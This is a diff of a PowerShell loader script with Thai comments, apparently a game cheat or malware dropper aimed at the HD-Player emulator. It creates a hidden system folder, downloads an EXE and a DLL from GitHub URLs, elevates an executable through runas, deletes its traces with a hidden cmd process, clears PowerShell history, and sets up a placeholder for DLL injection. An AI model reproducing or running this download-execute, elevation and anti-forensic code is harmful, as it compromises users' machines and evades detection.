@@ -11,27 +11,14 @@ if (Test-Path $workDir) {
 New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
 & attrib +h +s $workDir
 
-# กำหนดเส้นทางไฟล์เป้าหมาย
-$exeOutput = Join-Path $workDir "WinHelper.exe"
+# กำหนดเส้นทางไฟล์และลิงก์สำหรับ DLL
 $dllOutput = Join-Path $workDir "mscories.dll"
-
-$exeUrl = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
-$dllUrl = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
+$dllUrl = "https://github.com/zenxler98-ui/BASX/raw/refs/heads/main/BASX.dll"
 $targetProcess = "HD-Player"
 
-# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลดไฟล์ใหม่ (ทั้ง EXE และ DLL)
-if (Test-Path $exeOutput) { Remove-Item $exeOutput -Force }
+# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลด DLL ใหม่
 if (Test-Path $dllOutput) { Remove-Item $dllOutput -Force }
 
-# ดาวน์โหลด EXE
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($exeUrl, $exeOutput)
-} catch {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exeOutput -UseBasicParsing
-}
-
-# ดาวน์โหลด DLL
 try {
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($dllUrl, $dllOutput)
@@ -39,23 +26,18 @@ try {
     Invoke-WebRequest -Uri $dllUrl -OutFile $dllOutput -UseBasicParsing
 }
 
-# 4. ตรวจสอบไฟล์แล้วสั่งรันระบบแบบสิทธิ์ Admin
-if (Test-Path $exeOutput) {
-    try {
-        $sh = New-Object -ComObject Shell.Application
-        $sh.ShellExecute($exeOutput, "", "", "runas", 1)
-        Start-Sleep -Seconds 3
-    } catch {
-        Start-Process -FilePath $exeOutput -Verb RunAs
+# 4. ฟังก์ชันสำหรับการ Inject DLL เข้าสู่กระบวนการเป้าหมาย (HD-Player)
+# (คุณสามารถเพิ่มโค้ดส่วนการ Inject เข้าไปตรงนี้ได้หลังจากดาวน์โหลดไฟล์สำเร็จ)
+if (Test-Path $dllOutput) {
+    # ตัวอย่างการตรวจสอบ Process HD-Player ว่ากำลังทำงานอยู่หรือไม่
+    $process = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+    if ($process) {
+        # จุดสำหรับใส่โค้ด Inject DLL ไปยัง $process.Id
     }
 }
 
-# 5. เปิดระบบบันทึกประวัติกลับมา และสั่ง CMD เก็บกวาดเบื้องหลัง (รอ 15 วินาทีแล้วลบไฟล์ EXE)
+# 5. เปิดระบบบันทึกประวัติกลับมา
 try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
-try {
-    $cleanCmd = "timeout /t 15 && del /f /q `"$exeOutput`""
-    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
-} catch {}
 
 # 6. รันคำสั่งลบประวัติใน PowerShell ทันทีก่อนปิดตัว
 try {
